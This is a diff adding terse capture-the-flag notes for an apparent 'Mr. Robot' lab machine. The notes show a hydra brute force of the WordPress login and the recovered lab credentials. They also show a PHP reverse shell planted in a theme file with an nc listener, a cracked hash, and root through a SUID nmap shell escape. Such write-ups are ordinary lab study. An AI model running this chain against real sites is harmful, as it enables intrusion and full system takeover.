@@ -1,0 +1,22 @@
+#getting admin
+
+http://10.10.60.194/robots.txt --> flag1.txt & fsocity.dic
+fsocity.dic --> hydra --> http://10.10.60.194/wp-login
+Elliot:ER28-0652
+http://10.10.60.194/wp-admin
+
+#getting reverse shell
+shell.php --> archive.php
+upload location: http://10.10.60.194/wp-content/themes/twentyfifteen/archive.php
+nc -lvp 1234
+
+#privilege escalation
+daemon@linux:~$ cat /home/robot/md5hash.txt
+c3fcd3d76192e4007dfb496cca67e13b
+--> robot:abcdefghijklmnopqrstuvwxyz
+robot@linux:~$ find / -perm /4000
+/usr/local/bin/nmap
+robot@linux:~$ nmap --interactive
+nmap> !sh
+# whoami
+root
